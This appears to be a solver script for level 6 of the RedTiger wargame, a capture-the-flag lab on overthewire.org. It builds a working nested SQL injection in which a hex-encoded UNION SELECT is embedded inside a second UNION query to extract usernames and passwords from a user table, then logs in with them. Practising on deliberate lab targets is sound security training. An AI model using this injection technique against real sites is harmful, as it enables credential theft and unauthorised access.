#!/usr/bin/env python3
import pickle
import tigers as tg
import tiger_cookies
from connect import my_request as req


def str_to_hex(s: str) -> str:
    return '0x' + (s.encode('utf-8')).hex()


def main():
    '''
    Target: Get the first user in table level6_users with status 1
    '''
    url = "https://redtiger.labs.overthewire.org/level6.php"
    base_name = 'level6_users'
    finds = ['username', 'password']  # What we are finding
    pass_r = 'The password for the next level is: '
    level = 'level6login'

    cooks = tiger_cookies.check_cookies(level)
    cook = dict(level6login=cooks[level])

    # Counting the number of columns
    p = f"' union select username,username,password,password,password from {base_name} where status=1 #"
    h = str_to_hex(p)
    print(h)

    html_visible = req.get_request(url, dict(user='1'), cook)
    p = f"0 union select 1,{h},3,4,5 from {base_name} where status=1"
    data = dict(user=p)
    keys = tg.find_param(url, len(finds), html_visible,
                         data, cook)

    # Authorization
    data = dict(user=keys[0], password=keys[1], login='Login')
    response = req.post_request(url, data, cook)

    # Еxtracting data from html
    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
    print('password:', passw)
    tiger_cookies.save_cookies(cooks, level, passw)


if __name__ == '__main__':
    main()





